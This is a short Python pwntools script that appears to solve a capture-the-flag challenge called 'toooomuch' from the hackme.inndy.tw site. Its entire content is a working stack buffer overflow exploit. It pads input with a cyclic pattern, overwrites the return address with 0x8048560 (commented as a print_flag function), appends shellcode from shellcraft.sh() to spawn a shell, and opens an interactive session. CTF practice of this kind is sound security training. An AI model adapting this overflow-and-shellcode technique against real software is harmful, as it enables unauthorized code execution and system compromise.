#!/usr/bin/env python3
from pwn import *

# Idea: buffer overflow and control the eip.
# Overflow the eip address to print_flag function

context(arch='i386', terminal=['tmux', 'neww'])
#r = remote('hackme.inndy.tw', 7702)
r = process('./toooomuch')
gdb.attach(r)

payload = cyclic(4 * 7)
payload += p32(0x8048560)
payload += asm(shellcraft.sh())
r.sendline(payload)

r.interactive()
